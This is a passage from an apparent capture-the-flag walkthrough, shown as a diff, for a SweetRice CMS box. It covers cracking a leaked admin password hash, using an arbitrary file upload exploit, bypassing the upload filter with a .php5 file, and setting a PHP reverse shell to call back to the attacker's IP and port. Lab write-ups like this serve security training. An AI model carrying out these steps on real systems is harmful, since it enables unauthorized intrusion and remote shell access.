@@ -97,3 +97,42 @@ You will notice the PHP code along with the hashed password and username:
 ```bash
   14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"
 ```
+
+11. Run the hashed password over at [CrackStation](https://crackstation.net/) and you will get the password for user ```manager```.
+```manager:Password123```
+
+12. go to ```/content/as``` and login with the username and password to verify. Once logged in, start the website.
+
+13. We are now going to use the 2 exploits found earlier. We can either upload the code in the dashboard > ads or we can use a python script to do the uploading.
+- [SweetRice 1.5.1 - Arbitrary File Upload Script](https://www.exploit-db.com/exploits/40716)
+
+14. We will also need to create our reverse shell and create a few ext to see which extension SweetRice will accept. In this CTF, .php5 will work.
+- [Php Reverse Shell Code](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
+
+You will need to edit part of the scripts. You will need to get your ip addr and edit the IP and PORT section of the code.
+```bash
+root@kali:~# ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000
+    link/ether 02:40:bb:15:91:a0 brd ff:ff:ff:ff:ff:ff
+    inet 10.10.141.19/16 brd 10.10.255.255 scope global dynamic eth0
+       valid_lft 3365sec preferred_lft 3365sec
+    inet6 fe80::40:bbff:fe15:91a0/64 scope link 
+       valid_lft forever preferred_lft forever
+```
+
+We will use ```10.10.141.19``` and port ```9001``` (you can choose your own port no.) and edit the following in the PHP script:
+
+```bash
+...
+$ip = '10.10.141.19';  // CHANGE THIS
+$port = 9001;       // CHANGE THIS
+...
+```
+
+
